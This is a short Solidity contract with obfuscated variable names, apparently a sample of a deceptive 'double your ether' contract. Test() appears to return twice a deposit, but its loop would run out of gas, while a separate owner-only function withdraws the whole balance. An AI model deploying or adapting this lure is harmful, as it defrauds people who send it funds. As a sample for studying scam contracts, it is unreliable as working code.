// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Test1
{
    address _0x83c157 = msg.sender;

    function _0xb51c63()
    payable
    public
    {
        require(msg.sender==_0x83c157);
        _0x83c157.transfer(this.balance);
    }

    function() payable {}

    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {

            var _0x8dab95 = 1;
            var _0x8a1095 = 0;
            var _0xc2d6f4 = msg.value*2;

            while(true)
            {
                if(_0x8dab95<_0x8a1095)break;
                if(_0x8dab95>_0xc2d6f4)break;

                _0x8a1095=_0x8dab95;
                _0x8dab95++;
            }
            msg.sender.transfer(_0x8a1095);
        }
    }
}